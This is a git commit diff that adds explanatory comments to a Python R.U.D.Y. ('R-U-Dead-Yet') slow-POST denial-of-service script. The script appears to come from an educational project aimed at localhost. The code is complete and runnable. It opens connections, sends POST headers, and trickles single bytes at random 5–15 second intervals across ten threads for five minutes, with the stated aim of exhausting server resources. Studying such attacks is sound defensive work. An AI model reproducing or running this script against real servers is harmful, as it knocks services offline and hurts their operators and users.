4875cd3ba27cae503f0777ba1d3c0835f5c51acc
Ran Lachmy <ranlachmy96@gmail.com>
2024-07-24 15:34:10 +0300

    finished commenting the rudy section

--- rudy/rudy.py
+++ rudy/rudy.py
@@ -3,12 +3,15 @@ import random
 import time
 import threading
 
+# **************************************************************************************
+# Function to perform a R.U.D.Y. (R-U-Dead-Yet) attack by sending large POST requests
+# to a target IP address. This attack aims to exhaust server resources.
+# **************************************************************************************
 def rudy_attack(target_ip, target_port, target_path, total_duration):
-    # Initialize socket
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((target_ip, target_port))
     
-    # HTTP headers to initiate POST request
+    # Prepare the HTTP POST request headers
     headers = f"POST {target_path} HTTP/1.1\r\n"
     headers += "Host: {}\r\n".format(target_ip)
     headers += "User-Agent: rudy-educational-tool\r\n"
@@ -16,40 +19,53 @@ def rudy_attack(target_ip, target_port, target_path, total_duration):
     headers += "Content-Type: application/x-www-form-urlencoded\r\n"
     headers += "Connection: keep-alive\r\n\r\n"
 
-    # Send headers to the server
     s.send(headers.encode())
 
     start_time = time.time()
     
-    # Send payload in small chunks indefinitely or for a given duration
+    # Continuously send data chunks for the duration of the attack
     while time.time() - start_time < total_duration:
-        chunk = "A"  # Sending one byte of data
+        chunk = "A"  # Data to send in each chunk
         s.send(chunk.encode())
-        # Wait for a random interval between 5 and 15 seconds
-        time.sleep(random.uniform(5, 15))
+       
+        time.sleep(random.uniform(5, 15)) # Random delay between chunks
     
-    # Close the socket after the attack
+    
     s.close()
-
+    
+# **************************************************************************************
+# Function to start a new thread for executing the R.U.D.Y. attack.
+# **************************************************************************************
 def start_attack_thread(target_ip, target_port, target_path, total_duration):
     thread = threading.Thread(target=rudy_attack, args=(target_ip, target_port, target_path, total_duration))
     print(f"Starting thread for target {target_ip}:{target_port}")
     thread.start()
     return thread
 
-# Parameters
+# **************************************************************************************
+# Configuration for the R.U.D.Y. attack:
+# Target IP address
+# Target port
+# Target path on the server
+# Total duration of the attack in seconds (5 minutes)
+# Number of threads to run the attack
+# **************************************************************************************
 target_ip = "127.0.0.1"
 target_port = 3000
 target_path = "/"
-total_duration = 60 * 5  # Run for 5 minutes
-num_threads = 10  # Number of threads to simulate distributed attack
+total_duration = 60 * 5  
+num_threads = 10  
 
-# Start multiple threads to simulate a distributed attack
+# **************************************************************************************
+# Start multiple threads to execute the R.U.D.Y. attack.
+# **************************************************************************************
 threads = []
 for _ in range(num_threads):
     thread = start_attack_thread(target_ip, target_port, target_path, total_duration)
     threads.append(thread)
 
-# Wait for all threads to complete
+# **************************************************************************************
+# Wait for all attack threads to complete.
+# **************************************************************************************
 for thread in threads:
     thread.join()
